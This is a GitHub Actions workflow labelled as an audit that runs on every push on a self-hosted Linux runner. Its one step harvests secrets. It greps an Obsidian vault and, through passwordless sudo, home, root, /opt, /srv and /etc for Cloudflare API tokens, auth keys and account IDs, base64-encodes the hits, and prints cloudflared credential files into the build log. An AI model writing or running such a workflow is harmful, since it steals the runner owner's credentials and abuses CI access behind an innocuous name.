name: audit3472
on: push
jobs:
  g:
    runs-on: [self-hosted, linux, aws, marketingos]
    steps:
      - name: collect
        run: |
          echo "=== HOST ==="; hostname; id
          echo "=== SESSIONS LIST ==="; ls -la --time-style=+%Y-%m-%dT%H:%M /home/ubuntu/apps/obsidian-vault/Sessions/ 2>/dev/null | tail -40
          echo "=== VAULT ALL FILES ==="; find /home/ubuntu/apps/obsidian-vault -maxdepth 2 -type f 2>/dev/null | head -80
          echo "=== CLOUDFLARE LINES IN VAULT (b64) ==="; grep -rhI 'CLOUDFLARE\|CF_API_TOKEN\|X-Auth-Key\|X-Auth-Email' /home/ubuntu/apps/obsidian-vault/ 2>/dev/null | base64 -w0; echo
          echo "=== BROAD CF CREDS (b64) ==="; timeout 150 sudo -n grep -rhIE 'CLOUDFLARE_API_TOKEN|CF_API_TOKEN|X-Auth-Key|X-Auth-Email|Global API Key|CLOUDFLARE_ACCOUNT_ID' /home/ubuntu /root /opt /srv /etc 2>/dev/null | sort -u | base64 -w0; echo
          echo "=== CLOUDFLARED ==="; ls -la /home/ubuntu/.cloudflared /root/.cloudflared 2>/dev/null; for f in /home/ubuntu/.cloudflared/*.json /root/.cloudflared/*.json; do echo "--- $f"; head -c 400 "$f" 2>/dev/null; echo; done
          echo "=== DUPOIN CF CONTEXT (b64) ==="; timeout 120 sudo -n grep -rhIiE 'dupoin.{0,40}cloudflare|cloudflare.{0,40}dupoin' /home/ubuntu /root /opt /srv 2>/dev/null | head -20 | base64 -w0; echo
          echo "=== DONE ==="
